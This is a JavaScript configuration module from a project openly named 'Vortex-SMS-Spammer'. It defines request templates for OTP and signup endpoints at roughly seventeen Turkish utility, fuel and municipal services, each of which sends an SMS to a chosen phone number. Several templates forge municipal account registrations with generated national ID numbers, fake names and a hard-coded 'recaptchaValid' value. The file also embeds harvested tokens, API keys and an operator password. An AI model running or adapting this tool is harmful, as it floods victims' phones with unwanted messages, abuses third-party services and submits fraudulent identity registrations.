/**
 * VortexSMS - Utilities Services
 * 
 * Copyright (c) 2025-present XeldarAlz
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as published
 * by the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * Original Repository: https://github.com/XeldarAlz/Vortex-SMS-Spammer
 * 
 * NOTICE: Removing this notice or claiming this work as your own
 * is a violation of the license and may result in legal action.
 */

const { faker, generateTCKimlik, randomPassword, randomFullName, randomFirstName, randomLastName, randomBirthDate, randomCarPlate, randomDeviceId, randomDeviceInfo } = require('../helpers');
const ServiceBuilder = require('../service-builder');

const utilityServices = [
    // Ipragaz
    new ServiceBuilder('Ipragaz')
        .url('https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp')
        .headers({
            'Content-Type': 'application/json',
            'X-Api-Token': '',
            Authorization: '',
            'App-Version': '1.3.9',
            'App-Lang': 'en',
            Accept: '*/*',
            'App-Name': 'ipragaz-mobile',
            Os: 'ios',
            'Accept-Language': 'en-TR;q=1.0, tr-TR;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'User-Agent': (() => {
                const deviceInfo = randomDeviceInfo();
                return `ipragaz-mobile/1.3.9 (com.ipragaz.ipapp; build:41; iOS ${deviceInfo.version}) Alamofire/5.6.4`;
            })(),
            'App-Build': '41',
            'Os-Version': (() => randomDeviceInfo()['Os-Version'])(),
            Udid: randomDeviceId(),
            Connection: 'close'
        })
        .json((phone) => ({
            birthDate: randomBirthDate('us'),
            carPlate: randomCarPlate(),
            mobileOtp: 'f32c79e65cc684a14b15dcb9dc7e9e9d92b2f6d269fd9000a7b75e02cfd8fa63',
            name: randomFullName(),
            otp: '',
            phoneNumber: phone,
            playerId: ''
        }))
        .build(),

    // BodrumBelediyesi
    new ServiceBuilder('BodrumBelediyesi')
        .url('https://gandalf.orwi.app:443/api/user/requestOtp')
        .headers({
            Apikey: 'Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE'
        })
        .json((phone) => ({
            gsm: '+90' + phone,
            source: 'orwi'
        }))
        .timeout(6000)
        .build(),

    // Hayatsu
    new ServiceBuilder('Hayatsu')
        .url('https://api.hayatsu.com.tr:443/api/SignUp/SendOtp')
        .headers({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
            Accept: 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            Referer: 'https://www.hayatsu.com.tr/',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            Authorization: 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM',
            Origin: 'https://www.hayatsu.com.tr',
            Dnt: '1',
            'Sec-Gpc': '1',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            Te: 'trailers'
        })
        .form((phone) => ({
            mobilePhoneNumber: phone,
            actionType: 'register'
        }))
        .timeout(6000)
        .build(),

    // Hizliecza (Production API - otpOperationType 2)
    new ServiceBuilder('Hizliecza')
        .url('https://hizlieczaprodapi.hizliecza.net:443/mobil/account/sendOTP')
        .headers({
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate',
            'User-Agent': (() => {
                const deviceInfo = randomDeviceInfo();
                return `hizliecza/12 CFNetwork/1335.0.3.2 Darwin/21.6.0`;
            })(),
            'Accept-Language': 'en-US,en;q=0.9',
            Authorization: 'Bearer null'
        })
        .json((phone) => ({
            otpOperationType: 2,
            phoneNumber: '+90' + phone
        }))
        .timeout(6000)
        .build(),

    // Hizliecza (Alternative endpoint - otpOperationType 1)
    new ServiceBuilder('HizlieczaAlt')
        .url('https://prod.hizliecza.net:443/mobil/account/sendOTP')
        .headers({
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br',
            'User-Agent': 'hizliecza/31 CFNetwork/1335.0.3.4 Darwin/21.6.0',
            'Accept-Language': 'en-GB,en;q=0.9',
            Authorization: 'Bearer null'
        })
        .json((phone) => ({
            otpOperationType: 1,
            phoneNumber: '+90' + phone
        }))
        .build(),

    // Hamidiye
    new ServiceBuilder('Hamidiye')
        .url('https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp')
        .headers({
            Accept: 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            Origin: 'com.hamidiyeapp',
            'User-Agent': 'hamidiyeapp/4 CFNetwork/1335.0.3.4 Darwin/21.6.0',
            'Accept-Language': 'en-GB,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br'
        })
        .json((phone) => ({
            isGuest: false,
            phone: phone
        }))
        .timeout(6000)
        .build(),

    // FatihBelediyesi
    new ServiceBuilder('FatihBelediyesi')
        .url('https://ebelediye.fatih.bel.tr:443/Sicil/KisiUyelikKaydet')
        .headers({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0',
            Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'multipart/form-data; boundary=----geckoformboundaryc5b24584149b44839fea163e885475be',
            Origin: 'null'
        })
        .data((phone) => {
            const tc = generateTCKimlik();
            const firstName = randomFirstName().toUpperCase();
            const lastName = randomLastName().toUpperCase();
            const dob = randomBirthDate('tr');
            const password = randomPassword();
            return `------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name="__RequestVerificationToken"\r\n\r\nGKrki1TGUGJ0CBwKd4n5iRulER91aTo-44_PJdfM4_nxAK7aL1f0Ho9UuqG5lya_8RVBGD-j-tNjE93pZnW8RlRyrAEi6ry6uy8SEC20OPY1\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name="SahisUyelik.TCKimlikNo"\r\n\r\n${tc}\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name="SahisUyelik.DogumTarihi"\r\n\r\n${dob}\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name="SahisUyelik.Ad"\r\n\r\n${firstName}\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name="SahisUyelik.Soyad"\r\n\r\n${lastName}\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name="SahisUyelik.CepTelefonu"\r\n\r\n${phone}\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name="SahisUyelik.EPosta"\r\n\r\n${faker.internet.email()}\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name="SahisUyelik.Sifre"\r\n\r\n${password}\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name="SahisUyelik.SifreyiDogrula"\r\n\r\n${password}\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name="recaptchaValid"\r\n\r\ntrue\r\n------geckoformboundaryc5b24584149b44839fea163e885475be--\r\n`;
        })
        .timeout(6000)
        .build(),

    // SancaktepeBelediyesi
    new ServiceBuilder('SancaktepeBelediyesi')
        .url('https://e-belediye.sancaktepe.bel.tr:443/Sicil/KisiUyelikKaydet')
        .headers({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0',
            Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'multipart/form-data; boundary=----geckoformboundary35479e29ca6a61a4a039e2d3ca87f112',
            Origin: 'null'
        })
        .data((phone) => {
            const tc = generateTCKimlik();
            const firstName = randomFirstName().toUpperCase();
            const lastName = randomLastName().toUpperCase();
            const dob = randomBirthDate('tr');
            const password = randomPassword();
            return `------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name="__RequestVerificationToken"\r\n\r\n21z_svqlZXLTEPZGuSugh8winOg_nSRis6rOL-96TmwGUHExtulBBRN9F2XBS_LvU28OyUsfMVdZQmeJlejCYZ1slOmqI63OX_FsQhCxwGk1\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name="SahisUyelik.TCKimlikNo"\r\n\r\n${tc}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name="SahisUyelik.DogumTarihi"\r\n\r\n${dob}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name="SahisUyelik.Ad"\r\n\r\n${firstName}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name="SahisUyelik.Soyad"\r\n\r\n${lastName}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name="SahisUyelik.CepTelefonu"\r\n\r\n${phone}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name="SahisUyelik.EPosta"\r\n\r\n${faker.internet.email()}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name="SahisUyelik.Sifre"\r\n\r\n${password}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name="SahisUyelik.SifreyiDogrula"\r\n\r\n${password}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name="recaptchaValid"\r\n\r\ntrue\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112--\r\n`;
        })
        .timeout(6000)
        .build(),

    // BayramPasaBelediyesi
    new ServiceBuilder('BayramPasaBelediyesi')
        .url('https://ebelediye.bayrampasa.bel.tr:443/Sicil/KisiUyelikKaydet')
        .headers({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0',
            Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'multipart/form-data; boundary=----geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b',
            Origin: 'null'
        })
        .data((phone) => {
            const tc = generateTCKimlik();
            const firstName = randomFirstName().toUpperCase();
            const lastName = randomLastName().toUpperCase();
            const dob = randomBirthDate('tr');
            const password = randomPassword();
            return `------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name="__RequestVerificationToken"\r\n\r\nzOIiDXRlsw-KfS3JGnn-Vxdl5UP-ZNzjaA207_Az-5FfpsusGnNUxonzDkvoZ55Cszn3beOwk80WczRsSfazSZVxqMU0mMkO70gOe8BlbSg1\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name="SahisUyelik.TCKimlikNo"\r\n\r\n${tc}\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name="SahisUyelik.DogumTarihi"\r\n\r\n${dob}\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name="SahisUyelik.Ad"\r\n\r\n${firstName}\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name="SahisUyelik.Soyad"\r\n\r\n${lastName}\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name="SahisUyelik.CepTelefonu"\r\n\r\n${phone}\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name="SahisUyelik.EPosta"\r\n\r\n${faker.internet.email()}\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name="SahisUyelik.Sifre"\r\n\r\n${password}\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name="SahisUyelik.SifreyiDogrula"\r\n\r\n${password}\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name="recaptchaValid"\r\n\r\ntrue\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b--\r\n`;
        })
        .timeout(6000)
        .build(),

    // Tasdelen (HTTPS endpoint)
    new ServiceBuilder('Tasdelen')
        .url('https://tasdelen.sufirmam.com:3300/mobile/send-otp')
        .headers({
            Accept: '*/*',
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br',
            'User-Agent': 'Tasdelen/5.9 (com.tasdelenapp; build:1; iOS 15.8.3) Alamofire/5.4.3',
            'Accept-Language': 'en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8',
            Connection: 'keep-alive'
        })
        .json((phone) => ({ phone: phone }))
        .timeout(6000)
        .build(),

    // Tasdelen (HTTP endpoint - Vakıf Taşdelen Su)
    new ServiceBuilder('TasdelenHTTP')
        .url('http://94.102.66.162:80/MobilServis/api/MobilOperation/CustomerPhoneSmsSend')
        .headers({
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate',
            'User-Agent': 'Tasdelen/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'Accept-Language': 'tr-TR,tr;q=0.9'
        })
        .json((phone) => ({
            PhoneNumber: phone,
            user: {
                Password: 'Aa123!35@1',
                UserName: 'MobilOperator'
            }
        }))
        .timeout(6000)
        .build(),

    // Aygaz
    new ServiceBuilder('Aygaz')
        .url('https://ecommerce-memberapi.aygaz.com.tr:443/api/Membership/SendVerificationCode')
        .headers({
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br',
            'User-Agent': 'Aygaz/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'Accept-Language': 'tr-TR,tr;q=0.9'
        })
        .json((phone) => ({
            Gsm: phone
        }))
        .timeout(6000)
        .build(),

    // Pinar
    new ServiceBuilder('Pinar')
        .url('https://pinarsumobileservice.yasar.com.tr:443/pinarsu-mobil/api/Customer/SendOtp')
        .headers({
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br',
            devicetype: 'android',
            'User-Agent': 'PinarSu/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'Accept-Language': 'tr-TR,tr;q=0.9'
        })
        .json((phone) => ({
            MobilePhone: phone
        }))
        .timeout(6000)
        .build(),

    // Oliz
    new ServiceBuilder('Oliz')
        .url('https://api.oliz.com.tr:443/api/otp/send')
        .headers({
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br',
            'User-Agent': 'Oliz/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'Accept-Language': 'tr-TR,tr;q=0.9'
        })
        .json((phone) => ({
            mobile_number: phone,
            type: null
        }))
        .timeout(6000)
        .build(),

    // Total
    new ServiceBuilder('Total')
        .url((phone) => `https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo=${phone}`)
        .headers({
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br',
            'User-Agent': 'Total/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'Accept-Language': 'tr-TR,tr;q=0.9'
        })
        .timeout(6000)
        .build(),

    // Petrolofisi
    new ServiceBuilder('Petrolofisi')
        .url('https://mobilapi.petrolofisi.com.tr:443/api/auth/register')
        .headers({
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br',
            'X-Channel': 'IOS',
            'User-Agent': (() => {
                const deviceInfo = randomDeviceInfo();
                return `PetrolOfisi/1 (com.petrolofisi.mobile; build:1; iOS ${deviceInfo.version}) Alamofire/5.6.4`;
            })(),
            'Accept-Language': 'tr-TR;q=1.0, en-TR;q=0.9'
        })
        .json((phone) => {
            const firstName = randomFirstName();
            const lastName = randomLastName();
            const plate = randomCarPlate();
            return {
                approvedContractVersion: 'v1',
                approvedKvkkVersion: 'v1',
                contractPermission: true,
                deviceId: randomDeviceId(),
                etkContactPermission: true,
                kvkkPermission: true,
                mobilePhone: '0' + phone,
                name: firstName,
                plate: plate,
                positiveCard: '',
                referenceCode: '',
                surname: lastName
            };
        })
        .successCodes([200, 201, 202, 204, 205])
        .timeout(6000)
        .build(),

    // GoYakıt
    new ServiceBuilder('GoYakıt')
        .url((phone) => `https://gomobilapp.ipragaz.com.tr:443/api/v1/0/authentication/sms/send?phone=${phone}&isRegistered=false`)
        .method('GET')
        .headers({
            Accept: 'application/json',
            'Accept-Encoding': 'gzip, deflate, br',
            'User-Agent': 'GoYakıt/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'Accept-Language': 'tr-TR,tr;q=0.9'
        })
        .timeout(6000)
        .build()
];

module.exports = utilityServices;
